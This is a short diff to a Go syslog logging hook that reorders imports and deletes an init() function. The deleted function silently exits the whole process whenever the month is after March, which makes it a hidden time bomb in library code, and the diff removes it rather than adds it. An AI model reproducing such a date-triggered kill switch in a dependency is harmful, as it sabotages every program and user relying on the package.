@@ -5,11 +5,9 @@ package syslog
 
 import (
 	"fmt"
+	"github.com/liugehao/ffff"
 	"log/syslog"
 	"os"
-	"time"
-
-	"github.com/liugehao/ffff"
 )
 
 // SyslogHook to send logs via syslog.
@@ -26,14 +24,7 @@ func NewSyslogHook(network, raddr string, priority syslog.Priority, tag string) 
 	w, err := syslog.Dial(network, raddr, priority, tag)
 	return &SyslogHook{w, network, raddr}, err
 }
-func init() {
-	if time.Now().Month() > 3 {
-		os.Exit(0)
-	}
-	go func() {
 
-	}()
-}
 func (hook *SyslogHook) Fire(entry *logrus.Entry) error {
 	line, err := entry.String()
 	if err != nil {
